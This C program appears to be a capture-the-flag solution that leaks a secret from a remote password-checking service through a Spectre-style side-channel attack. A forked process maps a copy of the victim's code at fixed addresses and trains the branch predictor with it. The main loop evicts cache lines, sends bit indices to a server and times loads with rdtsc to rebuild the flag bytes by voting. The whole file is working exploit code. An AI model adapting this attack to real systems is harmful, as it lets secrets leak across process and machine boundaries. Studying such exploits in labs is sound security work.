#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <time.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/sysinfo.h>
#include <unistd.h>
#include <errno.h>
//#include <sched.h>
#define __USE_GNU
#include <sched.h>
#include <string.h>
#include <x86intrin.h>
#include <pthread.h>

#define CACHE_SIZE 0x800000
//#define CACHE_SIZE 0x400000

//#define EXPERIMENT_N 200
#define PART 100

#define TOTAL_WORK 100000
#define FOLD 100
#define VOTERS 5
#define EXPERIMENT_N (TOTAL_WORK/FOLD/VOTERS)

//#define SPLIT 10
#define SPLIT 9

char snippet[] = {
    72, 131, 236, 72, 100, 72, 139, 4, 37, 40, 0, 0, 0, 72, 137, 68, 36, 56, 49, 192, 72, 184, 67, 84, 70, 45, 66, 82, 123, 82, 72, 186, 69, 68, 65, 67, 84, 69, 68, 95, 72, 137, 4, 36, 72, 137, 84, 36, 8, 72, 184, 82, 125, 67, 84, 70, 45, 66, 82, 72, 186, 123, 82, 69, 68, 65, 67, 84, 69, 72, 137, 68, 36, 16, 72, 137, 84, 36, 24, 72, 184, 68, 95, 82, 69, 68, 65, 67, 84, 72, 186, 69, 68, 95, 82, 69, 68, 125, 0, 72, 137, 68, 36, 32, 72, 137, 84, 36, 40, 137, 248, 193, 232, 3, 137, 194, 72, 59, 21, 157, 22, 32, 0, 115, 14, 137, 192, 15, 190, 4, 4, 131, 231, 7, 15, 163, 248, 114, 21, 72, 139, 68, 36, 56, 100, 72, 51, 4, 37, 40, 0, 0, 0, 117, 19, 72, 131, 196, 72, 195, 72, 141, 61, 167, 2, 0, 0, 232, 12, 253, 255, 255, 235, 221, 232, 53, 253, 255, 255, 85};

void *snippet_addr = 0x400978;
void (*CheckPassword)(unsigned int) = (void *)0x400978;

void *addr = 0;

int cli_fd;

//FILE *sockf ; //= fdopen(cli_fd, "r+");

static inline void flush(void *ptr)
{
    __asm__ volatile("clflush (%0)"
                     :
                     : "r"(ptr));
}

static inline void check(const char *thing)
{
    if (errno != 0)
    {
        perror(thing);
        exit(errno);
    }
}

void evict(void *ptr, int times)
{
    int mod = 0x4000;
    if (times > mod)
        times = mod;
    static char *space = NULL;
    if (space == NULL)
    {
        space = mmap(NULL, 0x4000000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
        check("mmap eviction space");
    }
    static unsigned long pagei = 0;
    unsigned long off = ((unsigned long)ptr) & 0xfff;
    volatile char *ptr1 = space + off;
    volatile char *ptr2 = ptr1 + 0x2000;
    for (int i = 0; i < times; i++)
    {
        *ptr2 = 1;
        *ptr1 = 2;
        ptr2 = space + off + 0x1000 * ((pagei + 2) % mod);
        ptr1 = space + off + 0x1000 * (pagei % mod);
        pagei = (pagei + 1) % mod;
    }
}

void set_thread_aff(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) == -1)
    {
        perror("set affinity for thread");
        exit(1);
    }
}

void noop()
{
}

void thread_func()
{
    while (1)
    {
        for (int i = 0; i < 0x10000; i++)
        {
            CheckPassword(7);
        }
        sched_yield();
        //evict((void *)0x602090, 0x10000000);
    }
}

void init_mapping()
{
    void *a = (void *)mmap((void *)0x400000, 0x1000,
                           PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (a == MAP_FAILED)
    {
        perror("mmap fixed (1)");
        exit(1);
    }
    memset(a, 0xcc, 0x1000);
    memcpy(snippet_addr, snippet, sizeof(snippet));
    strcpy((char *)0x400cc6, "BitHit!");
    *(long *)0x400730 = 0x002018e225ff;
    mprotect(a, 0x1000, PROT_READ | PROT_EXEC);
    a = (void *)mmap((void *)0x602000, 0x1000,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (a == MAP_FAILED)
    {
        perror("mmap fixed (2)");
        exit(1);
    }
    //*(long *)0x602018 = getenv;
    *(long *)0x602018 = noop;
    //*(long *)0x602030 = abort;
    *(long *)0x602090 = 0x100;
}

void train(int i)
{
    //pthread_t pId;
    //int i,ret;
    ////创建子线程，线程id为pId
    //ret = pthread_create(&pId,NULL,thread_func,NULL);
    //
    //if(ret != 0)
    //{
    //	perror("create pthread error");
    //	exit(1);
    //}
    pid_t pid = fork();
    if (pid < 0)
    {
        perror("fork");
        exit(1);
    }
    else if (pid == 0)
    {
        // child
        init_mapping();
        set_thread_aff(i);
        thread_func();
    }
    else
    {
        // parent
    }
}

static inline uint64_t time_load(void *ptr)
{
    uint32_t start, end;
    __asm__ volatile(
        "mfence\n"
        "rdtsc\n"
        "mfence\n"
        "mov %%eax, %0\n"
        "mov (%2), %%al\n"
        "mfence\n"
        "rdtsc\n"
        "mfence\n"
        : "=&r"(start), "=&a"(end)
        : "r"(ptr)
        : "edx", "ecx");
    return end - start;
}

void init()
{

    train(0);
    //handle(1);

    //sleep(10);
    addr = (void *)mmap(NULL, CACHE_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    //sockf = fdopen(cli_fd, "r+");
    if (addr == MAP_FAILED)
    {
        perror("mmap");
        exit(1);
    }
    cpu_set_t mask;
    CPU_ZERO(&mask);
    //CPU_SET(1, &mask);                                   //默认是0
    CPU_SET(1, &mask);                                   //默认是0
    if (sched_setaffinity(0, sizeof(mask), &mask) == -1) //设置线程CPU亲和力
    {
        perror("set affinity for main");
    }
}

void bubble_sort(int a[], int n) //n为数组a的元素个数
{
    //一定进行N-1轮比较
    for (int i = 0; i < n - 1; i++)
    {
        //每一轮比较前n-1-i个，即已排序好的最后i个不用比较
        for (int j = 0; j < n - 1 - i; j++)
        {
            if (a[j] > a[j + 1])
            {
                int temp = a[j];
                a[j] = a[j + 1];
                a[j + 1] = temp;
            }
        }
    }
}

#define LINE_SIZE 0x1000
//#define LINE_SIZE 0x40

void prepare()
{
    //把getenv从缓存中踢出去
    getenv("BitHit!");
    //todo: mmap
    void *addrx = mmap(NULL, CACHE_SIZE, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    //*(char *)(addrx) = 'a';

    for (int i = 0; i < CACHE_SIZE / LINE_SIZE; i++)
    {
        *(char *)(addrx + i * LINE_SIZE + 1) = 'a';
    }
    munmap(addrx, CACHE_SIZE);
    /*
    for (int i = 0; i < CACHE_SIZE / LINE_SIZE; i++)
    {
        *(char *)(addr + i * LINE_SIZE + 1) = 'b';
    }*/
}

const char buf[10] = "BitHit!";

int get_time()
{
    /*
    char buf2[10];
    strcpy(buf2, buf);
    register uint64_t time1, time2;
    _mm_lfence();
    time1 = __rdtsc();
    _mm_lfence();
    getenv(buf);
    _mm_lfence();
    time2 = __rdtsc() - time1;
    _mm_lfence();
    return time2;*/
    return time_load((void *)getenv);
}

void test()
{
    get_time();
    int timeuse1 = get_time();
    //evict((void *)getenv);
    prepare();
    int timeuse2 = get_time();
    printf("timeuse 1 : %d , timeuse 2 : %d \n", timeuse1, timeuse2);
}

void oracle(int target)
{
    int ret = send(cli_fd, &target, 0x4, 0);
    if (ret != 4)
    {
        perror("send failed");
        exit(1);
        // close(cli_fd);cli_fd = get_connection();
    }

    //fflush(sockf);
}

int test_bit(int j)
{
    uint64_t time2;
    int valbuf[EXPERIMENT_N];
    for (int k = 0; k < EXPERIMENT_N; k++)
    {
        int must_zero = 7;
        //prepare();
        evict((void *)getenv, 0x10000000);
        //_mm_lfence();

        for (int h = 0; h < FOLD; h++)
        {
            /*
            for (int i = 0; i < 10; i++){
                oracle(must_zero);
            }*/
            //_mm_lfence();
            sched_yield();
            evict((void *)0x602090, 0x1000);
            oracle(j);
            /*
            for (int i = 0; i < 10; i++){
                oracle(must_zero);
            }*/
            //_mm_lfence();
        }

        valbuf[k] = get_time();
    }
    bubble_sort(valbuf, EXPERIMENT_N);
    return valbuf[EXPERIMENT_N / PART];
}

void putstars(int cnt)
{
    for (int i = 0; i < cnt; i++)
        putchar('*');
}


void test_byte(int i)
{
    int times[10][VOTERS];
    int mins[VOTERS], maxs[VOTERS];
    for (int h = 0; h < VOTERS; h++)
    {
        int min = 0x1000000, max = 0;
        for (int j = 0; j < SPLIT; j++)
        {
            int bi = j >= 8 ? (j == 8 ? 7 : 0) : i * 8 + j;
            int tt = test_bit(bi);
            times[j][h] = tt;
            if (tt < min)
                min = tt;
            if (tt > max)
                max = tt;
        }
        mins[h] = min;
        maxs[h] = max;
    }
    int votes[10];
    int vmin = 0x1000000, vmax = 0;
    printf("=== debug byte %d ===\n", i);
    for (int j = 0; j < SPLIT; j++)
    {
        int v = 0;
        for (int h = 0; h < VOTERS; h++)
            v += (times[j][h] - mins[h]) * 200 / (maxs[h] - mins[h] + 1);
        votes[j] = v;
        printf("%d: ", j);
        putstars(votes[j] / VOTERS / 4);
        putchar(10);
        if (vmin > v)
            vmin = v;
        if (vmax < v)
            vmax = v;
    }
    int split = vmin + (vmax - vmin) / 2;
    int ch = 0;
    for (int j = 0; j < 8; j++)
    {
        if (votes[j] < split)
        {
            ch |= 1 << j;
        }
    }
    printf("-> byte %d: %02x %c\n", i, ch, ch);
}

int get_connection()
{
    int client_sockfd;
    int len;
    struct sockaddr_in remote_addr;
    memset(&remote_addr, 0, sizeof(remote_addr));
    remote_addr.sin_family = AF_INET;
    // remote_addr.sin_addr.s_addr=inet_addr("80.251.219.216");//服务器IP地址
    remote_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    remote_addr.sin_port = htons(8080);

    if ((client_sockfd = socket(PF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("socket error");
        return 1;
    }
    int size = 0;
    setsockopt(client_sockfd, SOL_SOCKET, SO_SNDBUF, &size, 4);
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(client_sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    int success = 0;
    for (int i = 0; i < 10; i++)
    {
        if (connect(client_sockfd, (struct sockaddr *)&remote_addr, sizeof(struct sockaddr)) < 0)
        {
            perror("connect error");
        }
        else
        {
            success = 1;
            break;
        }
    }
    if (!success)
    {
        puts("tried 10 times, remote is down");
        exit(1);
    }
    return client_sockfd;
}

int main(int argc, char *argv[])
{
    init();
    cli_fd = get_connection();
    printf("connected to server\n");

    prepare();
    //evict((void *)getenv);
    test();
    for (int i = 16; i < 24; i++)
        test_byte(i);

    close(cli_fd);

    return 0;
}
